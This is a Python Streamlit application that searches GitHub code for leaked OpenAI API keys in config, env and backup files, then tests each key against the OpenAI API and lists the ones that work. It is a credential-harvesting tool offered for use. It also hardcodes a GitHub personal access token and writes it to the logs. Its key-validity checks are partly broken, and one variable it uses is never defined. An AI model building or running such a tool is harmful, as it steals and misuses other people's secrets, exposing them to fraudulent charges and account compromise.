import streamlit as st
import requests
import aiohttp
import asyncio
import re
import os
import openai
import logging

# Initialize logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Constants
GITHUB_TOKEN = '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'
GITHUB_API_URL = 'https://api.github.com/search/code'
OPENAI_API_URL = 'https://api.openai.com/v1/chat/completions'

logger.info(f"GitHub Token: {GITHUB_TOKEN}")
logger.info(f"OpenAI API Key: {OPENAI_API_KEY}")

# Default search query
DEFAULT_SEARCH_QUERY = """
(path:*.xml OR path:*.json OR path:*.properties OR path:*.sql OR path:*.txt OR path:*.log OR path:*.tmp OR path:*.backup OR path:*.bak OR path:*.enc OR path:*.yml OR path:*.yaml OR path:*.toml OR path:*.ini OR path:*.config OR path:*.conf OR path:*.cfg OR path:*.env OR path:*.envrc OR path:*.prod OR path:*.secret OR path:*.private OR path:*.key) AND 
(access_key OR secret_key OR access_token OR api_key OR apikey OR api_secret OR apiSecret OR app_secret OR application_key OR app_key OR appkey OR auth_token OR authsecret) AND 
(/sk-[a-zA-Z0-9]{48}/ AND (openai OR gpt))
"""

# Function to search GitHub for potential OpenAI API keys
def search_github(query):
    headers = {
        'Authorization': f'token {GITHUB_TOKEN}',
        'Accept': 'application/vnd.github.v3+json'
    }
    params = {'q': query, 'per_page': 100}
    try:
        response = requests.get(GITHUB_API_URL, headers=headers, params=params)
        response.raise_for_status()
        logger.info(f"GitHub search completed successfully.")
        return response.json()
    except requests.RequestException as e:
        logger.error(f"Error searching GitHub: {e}")
        st.error("Error searching GitHub. Check the logs for details.")
        return {}

# Function to extract keys from the search results
def extract_keys(search_results):
    key_pattern = re.compile(r'sk-[a-zA-Z0-9]{48}')
    keys = set()
    for item in search_results.get('items', []):
        content_url = item['url']
        try:
            response = requests.get(content_url, headers={'Authorization': f'token {GITHUB_TOKEN}'})
            response.raise_for_status()
            matches = key_pattern.findall(response.text)
            keys.update(matches)
            logger.info(f"Keys extracted from {content_url}. Found {len(matches)} keys.")
        except requests.RequestException as e:
            logger.warning(f"Error fetching content from {content_url}: {e}")
    return list(keys)

# Function to test OpenAI keys using the OpenAI Python client
def test_openai_key(api_key):
    openai.api_key = api_key
    try:
        response = openai.ChatCompletion.create(
            model="gpt-3.5-turbo",
            messages=[
                {"role": "user", "content": "Say this is a test"}
            ]
        )
        if response.choices[0].message['content'] == "Say this is a test":
            logger.info("API key is valid.")
            return api_key
        else:
            logger.info("API key test failed.")
            return None
    except openai.error.AuthenticationError:
        logger.info("Invalid API key.")
        return None
    except openai.error.APIConnectionError:
        logger.info("Could not connect to the API.")
        return None
    except Exception as e:
        logger.error(f"An error occurred: {e}")
        return None

# Function to test all keys asynchronously
async def test_keys_async(keys):
    async with aiohttp.ClientSession() as session:
        tasks = [test_key_async(session, key) for key in keys]
        results = await asyncio.gather(*tasks)
        return [key for key in results if key is not None]

# Asynchronous key testing function
async def test_key_async(session, key):
    headers = {
        'Authorization': f'Bearer {key}',
        'Content-Type': 'application/json'
    }
    data = {
        'prompt': 'Say this is a test',
        'max_tokens': 5
    }
    try:
        async with session.post(OPENAI_API_URL, headers=headers, json=data) as response:
            if response.status == 200:
                result = await response.json()
                if result['choices'][0]['text'].strip() == "Say this is a test":
                    logger.info(f"Key {key} is valid.")
                    return key
    except Exception as e:
        logger.error(f"Error testing key {key}: {e}")
    return None

# Streamlit UI
st.title("GitHub OpenAI API Key Finder & Tester")

search_query = st.text_area("Search Query", DEFAULT_SEARCH_QUERY)

if st.button("Search and Test Keys"):
    with st.spinner("Searching GitHub..."):
        search_results = search_github(search_query)
    
    if search_results:
        keys = extract_keys(search_results)
        
        st.write(f"Found {len(keys)} keys.")
        
        if keys:
            with st.spinner("Testing keys..."):
                valid_keys = asyncio.run(test_keys_async(keys))
            
            st.write(f"Found {len(valid_keys)} valid keys.")
            if valid_keys:
                st.write(valid_keys)
            else:
                st.write("No valid keys found.")
        else:
            st.write("No keys found.")
    else:
        st.write("No results from GitHub.")
